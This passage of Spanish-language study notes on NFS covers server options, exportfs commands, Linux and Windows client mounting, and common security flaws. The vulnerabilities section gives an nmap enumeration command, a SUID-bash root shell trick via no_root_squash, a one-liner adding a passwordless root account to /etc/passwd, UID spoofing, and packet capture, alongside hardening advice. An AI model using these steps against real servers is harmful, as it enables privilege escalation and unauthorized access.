vers3=n / vers4=y / vers4.0=y / vers4.1=y / vers4.2=n  # activar versiones

[exportd] / [statd] / [lockd] # Cada uno separado
port=20048         # fijar puerto  (facilita firewall con NFSv3)
```

Tenemos además estos comandos para manejar el servidor:

| Acción                                        | Comando             |
| --------------------------------------------- | ------------------- |
| Aplicar cambios en /etc/exports sin reiniciar | `sudo exportfs -r`  |
| Exportar todo lo  definido en /etc/exports    | `sudo exportfs -a`  |
| Desexportar todo                              | `sudo exportfs -ua` |
| Ver exports y sus versiones                   | `sudo exportfs -v`  |

---
## 4.3. 💻 Acceder desde otro sistema 

El cliente se instala como `sudo apt install nfs-common -y`

Luego podemos ver que exporta un servidor con `showmount -e 192.168.1.50`

Para el montaje
```bash
sudo mkdir -p /mnt/datos # Montar

sudo mount -t nfs 192.168.1.50:/srv/datos /mnt/datos # Montarlo, 
    # podemos forzar la versión con -o vers=4.1
    
sudo umount /mnt/datos # Desmontar
```

Windows incluye un cliente NFS como característica opcional:

```powershell
# Habilitar cliente NFS
Enable-WindowsOptionalFeature -Online -FeatureName ServicesForNFS-ClientOnly
Enable-WindowsOptionalFeature -Online -FeatureName NFS-Administration

mount \\192.168.1.50\srv\datos Z:             # Montar share NFS como unidad
mount -o anon \\192.168.1.50\srv\publico Z:   # acceso anónimo
mount     # Ver montajes activos
umount Z: # Desmontar
```

> [!NOTE] 
> **Cliente NFS de Windows y permisos**: El cliente NFS de Windows autentica por el UID/GID configurado del usuario de Windows, que habitualmente no coincide con los UIDs del servidor Linux. Es habitual tener que usar `all_squash` con un `anonuid` específico, o configurar el mapeo de identidades.

---
## 4.4. 🚨 Vulnerabilidades y fallos de seguridad habituales

Con Nmap podemos enumerarlo con `sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049`

#### 4.4.1. No_root_squash

Si un export tiene `no_root_squash`, el root del cliente tiene root en el servidor. Un atacante con root en cualquier máquina que pueda montar el share puede **escalar privilegios en el servidor** o en cualquier otra máquina que monte el mismo share.

- Podemos copiar una bash en la carpeta y asignarle permisos SUID (`chmod +s`) y ejecutarla con `-p`  → shell root en el servidor
- Tambien podemos sobrescribir el `/etc/passwd`: `echo 'wtf::0:0:wtf:/root:/bin/bash' | sudo tee -a /mnt/nfs_attack/passwd`
 
> Por tanto en el servidor podemos comprobar si hay exports con este permiso `sudo exportfs -v | grep no_root_squash`

#### 4.4.2. Confianza ciega en el UID del cliente

Con `sec=sys` (el default), NFS confía en el UID que declara el cliente sin verificarlo. Un atacante puede crear un usuario local con el mismo UID que un usuario del servidor y acceder a sus archivos.

 Ej: `sudo useradd -u 1001 admin_fake && sudo su - admin_fake` 

> Para evitarlo podemos usar autenticación kerberos o `all_squash + anonuid` para que todos los usuarios se mapeen a una cuenta de solo lectura.


> [!TIP] 
> Tips de hardening: Aparte de `root_squash` o evitar la confianza ciega en el UID:
> ⚠️No permitir que cualquier cliente se conecte: Ej `/srv/datos *(rw,sync)`
⚠️Con NFSv4 y firewalls estrictos, bloquear el puerto 111 (rpcbind) para que no haya enumeración de usuarios / shares
⚠️No exportar directorios sensibles (/etc, /root, /home)
⚠️No usar cifrado: un atacante puede leer los paquetes con `sudo tcpdump -i eth0 -w nfs_capture.pcap port 2049`

